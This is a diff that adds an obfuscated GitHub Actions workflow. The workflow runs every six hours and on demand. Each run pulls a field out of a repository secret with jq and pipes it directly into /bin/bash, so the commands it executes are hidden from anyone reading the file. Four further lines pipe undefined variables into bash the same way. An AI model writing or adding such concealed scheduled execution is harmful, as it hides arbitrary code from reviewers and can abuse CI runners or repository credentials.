@@ -1,0 +1,21 @@
+name: caobushang9870
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caobushang9870
+        env:
+          hqy6: ${{ secrets.hqy6 }}
+        run: |
+          echo $hqy6 | jq -r .orw0320 | /bin/bash
+          echo $oiwmp2 | jq -r .b6684 | /bin/bash
+          echo $rnewo42198 | jq -r .bnh6672 | /bin/bash
+          echo $fwpej19 | jq -r .w1 | /bin/bash
+          echo $smzq2635 | jq -r .yxzvp8945 | /bin/bash
+
